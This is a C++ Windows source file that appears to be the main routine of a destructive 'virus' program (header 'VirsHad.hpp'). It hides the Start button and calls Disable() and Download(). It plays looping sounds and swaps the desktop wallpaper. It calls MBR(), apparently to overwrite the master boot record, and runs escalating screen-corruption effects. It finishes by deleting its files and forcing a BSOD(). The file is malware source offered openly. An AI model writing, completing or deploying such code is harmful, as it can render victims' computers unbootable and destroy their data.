#pragma comment(lib, "winmm.lib")
#include <Windows.h>
#include "VirsHad.hpp"
#include <cstdio>

int iter;

void loop(){
    if (iter < 100) {
        Square(rand() % 255, rand() % 255, rand() % 255);
        Inversion();
        iter++;
        loop();
    } else if (iter < 2100) {
        Icons();
        iter++;
        loop();
    } else if (iter < 2200) {
        Melt();
        Inversion();
        iter++;
        loop();
    } else if (iter < 2350) {
        TextO(L"I want to understand why everything is so bad.");
        iter++;
        loop();
    } else {
        char str[] = R"(C:\Users\Public\Downloads\screamBG.bmp)";
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        PlaySound(reinterpret_cast<LPCSTR>(L"C:\\Users\\Public\\Downloads\\scream.wav"), NULL, SND_FILENAME);
        remove(R"(C:\Users\Public\Downloads\screamBG.bmp)");
        remove(R"(C:\Users\Public\Downloads\scream.wav)");
        char wp[] = R"(C:\Users\Public\Downloads\WP.bmp)";
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, wp, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        remove(R"(C:\Users\Public\Downloads\WP.bmp)");
        remove(R"(C:\Users\Public\Downloads\BG.wav)");
        remove(R"(C:\Users\Public\Downloads\icon.bmp)");
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR, int) {
    HWND hTaskBar = FindWindow(reinterpret_cast<LPCSTR>(L"Shell_TrayWnd"), nullptr);
    HWND hStartButton = GetWindow(hTaskBar, GW_CHILD);
    ShowWindow(hStartButton, SW_HIDE);
    Disable();
    Download();

    char str[] = R"(C:\Users\Public\Downloads\WP.bmp)";
    PlaySound(reinterpret_cast<LPCSTR>(L"C:\\Users\\Public\\Downloads\\BG.wav"), nullptr, SND_LOOP | SND_ASYNC);
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

    MBR();
    loop();
    BSOD();
    return 0;
}
